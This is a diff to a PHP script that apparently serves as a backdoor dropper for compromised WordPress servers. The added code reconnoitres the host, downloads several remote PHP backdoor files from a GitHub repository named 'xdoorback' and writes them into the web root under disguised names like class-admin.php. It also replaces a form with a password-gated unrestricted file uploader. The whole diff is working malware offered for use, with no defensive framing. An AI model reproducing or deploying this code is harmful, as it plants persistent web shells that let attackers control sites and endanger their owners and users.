@@ -5,6 +5,9 @@ $server = $_SERVER['HTTP_HOST'];
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
+echo "<b>Uname:".php_uname()."<br></b>"; 
+echo "<b>Base Dir : ".getcwd ()."<br></b>";
+
 function http_get($url){
 $im = curl_init($url);
 curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
@@ -15,7 +18,7 @@ return curl_exec($im);
 curl_close($im);
 }
 $check1 = $_SERVER['DOCUMENT_ROOT'] . "/wp-config-samsples.php" ;
-$text1 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/wordpress-samples.php');
+$text1 = http_get('https://raw.githubusercontent.com/0xWhoknows/symv2files/main/xdoor.php');
 $open1 = fopen($check1, 'w');
 fwrite($open1, $text1);
 fclose($open1);
@@ -47,7 +50,30 @@ if(file_exists($check4)){
 }
 echo " Stored he : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-wp.php\">".$_SERVER['HTTP_HOST']."/class-wp.php  </a>\n<br>";
 
+
+
+$check5 = $_SERVER['DOCUMENT_ROOT'] . "/class-admin.php" ;
+$text5 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/xx.php');
+$open5 = fopen($check5, 'w');
+fwrite($open5, $text5);
+fclose($open5);
+if(file_exists($check5)){
+}
+echo " Stored mini : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-admin.php\">".$_SERVER['HTTP_HOST']."/class-admin.php  </a>\n<br>";
+
+
+
+$check6 = $_SERVER['DOCUMENT_ROOT'] . "/class-lf.php" ;
+$text6 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/lf.php');
+$open6 = fopen($check6, 'w');
+fwrite($open6, $text6);
+fclose($open6);
+if(file_exists($check6)){
+}
+echo " Stored leaf : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-lf.php\">".$_SERVER['HTTP_HOST']."/class-lf.php  </a>\n<br>";
+
 ?>
+
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1256" /></head><body>
 <?php
@@ -69,9 +95,29 @@ if ( $_SESSION['pass']!== $pass)
 ?>
 
 
-<form enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
-File mu mas : <input name="file" type="file" /><br />
-<input type="submit" value="Upload" /></form>
+<?php
+
+error_reporting(0);
+set_time_limit(0);
+echo '<font color="black" size="4">';
+if(isset($_POST['Submit'])){
+    $filedir = ""; 
+    $maxfile = '2000000';
+    $mode = '0644';
+    $userfile_name = $_FILES['image']['name'];
+    $userfile_tmp = $_FILES['image']['tmp_name'];
+    if(isset($_FILES['image']['name'])) {
+        $qx = $filedir.$userfile_name;
+        @move_uploaded_file($userfile_tmp, $qx);
+        @chmod ($qx, octdec($mode));
+    echo" <a href=$userfile_name><b>Sucessfully Uploaded :D ==> $userfile_name</b></a>";
+    }
+}else{
+    echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
+}
+echo '</center></font>';
+
+?>
 
 
 <?php
